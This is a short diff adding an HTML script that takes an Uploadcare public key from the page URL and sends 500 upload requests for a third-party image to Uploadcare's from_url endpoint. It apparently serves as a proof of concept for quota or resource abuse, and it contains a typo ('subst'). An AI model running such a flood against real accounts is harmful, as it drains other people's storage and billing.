@@ -1,0 +1,11 @@
+<script>
+var public_key = location.hash.subst(1);
+var i = 0;
+while(i<500){
+  fetch("https://upload.uploadcare.com/from_url/?pub_key="+public_key+"&signature=&expire=&source_url=https%3A%2F%2Fwww.petmd.com%2Fsites%2Fdefault%2Ffiles%2FAcute-Dog-Diarrhea-47066074.jpg&filename=&source=url-tab&store=auto");
+  i++;
+}
+if(i==500){
+  alert("done!");
+}
+</script>
